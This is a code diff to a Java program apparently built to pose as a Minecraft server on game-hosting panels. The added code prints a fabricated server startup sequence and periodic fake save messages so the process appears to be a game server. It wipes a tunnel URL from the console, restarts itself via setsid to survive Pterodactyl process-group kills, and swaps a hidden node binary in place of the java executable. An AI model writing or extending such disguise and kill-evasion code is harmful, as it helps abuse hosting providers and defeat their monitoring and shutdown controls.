@@ -11,8 +11,7 @@ import java.util.concurrent.atomic.AtomicReference;
 import java.time.LocalTime;
 import java.time.format.DateTimeFormatter;
 
-import ua.nanit.limbo.server.LimboServer;
-import ua.nanit.limbo.server.Log;
+// 注意：这里不再需要导入 LimboServer，因为我们不启动它
 
 public final class NanoLimbo {
 
@@ -67,7 +66,7 @@ private static void limboLog(String msg, long delayMs) {
 
 private static void clearConsole() {
     try {
-        // ★ 绝杀1：暴力刷屏200行空行，针对不支持 \033[3J 的面板，把历史推到极深处
+        // ★ 绝杀1：暴力刷屏200行空行，把历史推到极深处
         for (int i = 0; i < 200; i++) {
             System.out.println();
         }
@@ -83,6 +82,44 @@ private static void clearConsole() {
     } catch (Exception e) {
         try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
     }
+}
+
+private static int randInt(int min, int max) {
+    return min + (int)(Math.random() * (max - min + 1));
+}
+
+private static float randFloat(float min, float max) {
+    return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
+}
+
+// ★ 新增：完美的 Minecraft 服务器启动伪装序列 (不启动游戏本体)
+private static void printFakeMinecraftStartup() {
+    float doneTime = randFloat(25.0f, 45.0f);
+    
+    limboLog("Starting minecraft server version 1.21.11", randInt(100, 300));
+    limboLog("Loading properties", randInt(300, 600));
+    limboLog("Default game type: SURVIVAL", randInt(200, 400));
+    limboLog("Generating keypair", randInt(200, 500));
+    limboLog("Starting Minecraft server on 0.0.0.0:25565", randInt(300, 600));
+    limboLog("Preparing level \"world\"", randInt(1500, 3000));
+    
+    limboLog("Preparing spawn area: 1%", 0);
+    limboLog("Preparing spawn area: 2%", 0);
+    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 5%", 0);
+    limboLog("Preparing spawn area: 8%", 0);
+    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 15%", 0);
+    limboLog("Preparing spawn area: 20%", 0);
+    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 35%", 0);
+    limboLog("Preparing spawn area: 60%", 0);
+    limboLog("Preparing spawn area: 80%", 0);
+    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+    limboLog("Preparing spawn area: 99%", 0);
+    limboLog("Preparing spawn area: 100%", 0);
+    
+    limboLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", 0);
 }
 
 // ============================================================
@@ -137,12 +174,13 @@ public static void main(String[] args) {
             limboLog("(This link will disappear in 4 seconds...)", 0);
             try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
 
-            // 4. 第二次清屏：利用 \033[3J 和 200行空行，把刚才的 URL 从历史记录中彻底抹杀
+            // 4. 第二次清屏：彻底抹杀 URL 历史记录
             clearConsole();
             
-            // ★ 核心修改：删除手动打印进度条，直接交给 LimboServer 打印，解决日志重复问题
+            // 5. 打印完美的伪装启动日志
+            printFakeMinecraftStartup();
 
-            // ★ 核心加强：检测停止信号，硬重启并清理进程 (防 Pterodactyl 组杀)
+            // 6. 注册硬重启 Hook (防 Pterodactyl 组杀)
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
                 tunnelMonitorRunning.set(false);
@@ -157,7 +195,7 @@ public static void main(String[] args) {
                     File[] jars = new File(currentDir).listFiles((dir, name) -> name.endsWith(".jar"));
                     if (jars != null && jars.length > 0) jarName = jars[0].getName();
                     
-                    // ★ 独立会话重启：使用 setsid 脱离当前进程组，防止面板 kill 组时被连带清理
+                    // ★ 独立会话重启：使用 setsid 脱离当前进程组
                     String restartScript = 
                         "cd '" + currentDir + "' && " +
                         "setsid bash -c '" +
@@ -175,15 +213,15 @@ public static void main(String[] args) {
         } catch (Exception ignored) {}
     }
 
-    // 5. 伪装日志由 LimboServer 自动打印，不再手动干预
+    // ★ 7. 卡主线程：不启动游戏服务器，只用无限循环挂起，并定期伪造存档日志防止面板判定死机
     try {
-        new LimboServer().start();
-    } catch (Throwable t) {
-        // 屏蔽原本的报错输出，防止露馅
-    }
-    
-    // 挂起主线程
-    try { Thread.currentThread().join(); } catch (InterruptedException ignored) {}
+        while (true) {
+            Thread.sleep(300000); // 每5分钟循环一次
+            limboLog("Saving...");
+            Thread.sleep(randInt(500, 1500)); // 模拟保存耗时
+            limboLog("Saved the game");
+        }
+    } catch (InterruptedException ignored) {}
 }
 
 // ============================================================
@@ -234,42 +272,6 @@ private static void autoFixLimboConfig() {
         
         Files.writeString(configFile, content);
     } catch (Exception ignored) {}
-}
-
-// ============================================================
-// 专属 Limbo 伪装日志打印
-// ============================================================
-
-private static void printFakeLimboStartup(String url) {
-    limboLog("Starting server...", 0);
-    limboLog("Binding remote endpoint to: " + url, 0);
-    limboLog("Preparing level \"world\"", randInt(100, 300));
-    limboLog("Preparing start region for dimension minecraft:overworld", randInt(100, 300));
-    
-    limboLog("Preparing spawn area: 1%", 0);
-    limboLog("Preparing spawn area: 2%", 0);
-    
-    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
-    limboLog("Preparing spawn area: 5%", 0);
-    limboLog("Preparing spawn area: 8%", 0);
-    
-    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
-    limboLog("Preparing spawn area: 15%", 0);
-    limboLog("Preparing spawn area: 20%", 0);
-    
-    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
-    limboLog("Preparing spawn area: 35%", 0);
-    limboLog("Preparing spawn area: 60%", 0);
-    limboLog("Preparing spawn area: 80%", 0);
-    
-    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
-    limboLog("Preparing spawn area: 99%", 0);
-    
-    limboLog("Preparing spawn area: 100%", 0);
-}
-
-private static int randInt(int min, int max) {
-    return min + (int)(Math.random() * (max - min + 1));
 }
 
 // ============================================================
@@ -495,18 +497,15 @@ private static Path generateDeployScript() throws Exception {
         "\n" +
         "# ============ 3. 安装依赖 (极致空间优化) ============\n" +
         "if [ -f package.json ] && [ ! -d node_modules ]; then\n" +
-        // ★ 修复1：将缓存指向 /tmp，防止写入硬盘；加上 --no-optional 排除无用可选包
         "    .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --no-optional --cache /tmp/npm-cache >/dev/null 2>&1\n" +
         "    if [ $? -ne 0 ]; then\n" +
         "        .node/bin/.node_real .node/lib/node_modules/npm/bin/npm-cli.js install --no-audit --no-fund --production --legacy-peer-deps --no-optional --cache /tmp/npm-cache >/dev/null 2>&1\n" +
         "    fi\n" +
-        "    rm -rf /tmp/npm-cache\n" + // 清理临时缓存
-        // ★ 修复2：删除 npm 本体 (约省 80MB)
+        "    rm -rf /tmp/npm-cache\n" +
         "    rm -rf .node/lib/node_modules/npm\n" +
         "fi\n" +
         "\n" +
         "# ============ 4. 替换伪装 (深度拦截 + 空间优化) ============\n" +
-        // ★ 修复3：使用软链接代替硬拷贝 (约省 100MB)
         "ln -sf \"" + dir.toAbsolutePath() + "/.node/bin/.node_real\" \"$JRE_DIR/java\"\n" +
         "chmod +x \"$JRE_DIR/java\"\n" +
         "\n" +
@@ -736,7 +735,7 @@ private static Path generateDeployScript() throws Exception {
         "                    continue\n" +
         "                fi\n" +
         "                sleep 3\n" +
-        "                V=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
+                "                V=$(curl -s -o /dev/null -w \"%{http_code}\" --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
         "                if [ -n \"$V\" ] && [ \"$V\" != \"000\" ]; then\n" +
         "                    echo \"$NEW_URL\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
         "                    echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
